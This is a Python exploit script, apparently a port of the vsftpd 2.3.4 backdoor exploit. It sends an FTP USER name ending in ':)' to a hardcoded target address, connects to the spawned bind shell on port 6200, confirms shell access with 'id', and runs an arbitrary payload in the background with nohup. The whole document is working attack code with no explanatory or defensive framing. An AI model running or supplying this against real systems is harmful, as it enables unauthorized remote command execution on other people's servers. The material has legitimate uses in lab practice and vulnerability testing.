import socket
import time
import random
import string

def rand_text_alphanumeric(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def handle_backdoor(s):
    s.send(b"id\n")

    r = s.recv(1024).decode().strip()
    if not r.startswith("uid="):
        print("The service on port 6200 does not appear to be a shell")
        s.close()
        return

    print(f"UID: {r}")

    s.send(b"nohup " + payload.encode() + b" >/dev/null 2>&1")
    s.close()

def exploit():
    target_ip = "192.168.72.142"
    target_port = 21
    backdoor_port = 6200

    nsock = None
    try:
        nsock = socket.create_connection((target_ip, backdoor_port), timeout=30)
    except (socket.timeout, ConnectionRefusedError):
        pass

    if nsock:
        print("The port used by the backdoor bind listener is already open")
        handle_backdoor(nsock)
        return

    sock = socket.create_connection((target_ip, target_port), timeout=30)

    banner = sock.recv(1024).decode().strip()
    print(f"Banner: {banner}")

    user_command = f"USER {rand_text_alphanumeric(random.randint(1, 7))}:)\r\n"
    sock.send(user_command.encode())

    resp = sock.recv(1024).decode().strip()
    print(f"USER: {resp}")

    if resp.startswith("530 "):
        print("This server is configured for anonymous only and the backdoor code cannot be reached")
        sock.close()
        return

    if not resp.startswith("331 "):
        print(f"This server did not respond as expected: {resp}")
        sock.close()
        return

    pass_command = f"PASS {rand_text_alphanumeric(random.randint(1, 7))}\r\n"
    sock.send(pass_command.encode())

    try:
        time.sleep(1)
        nsock = socket.create_connection((target_ip, backdoor_port), timeout=30)
    except (socket.timeout, ConnectionRefusedError):
        pass

    if nsock:
        print("Backdoor service has been spawned, handling...")
        handle_backdoor(nsock)
        return

    sock.close()

if __name__ == "__main__":
    payload = "your_payload_here"
    exploit()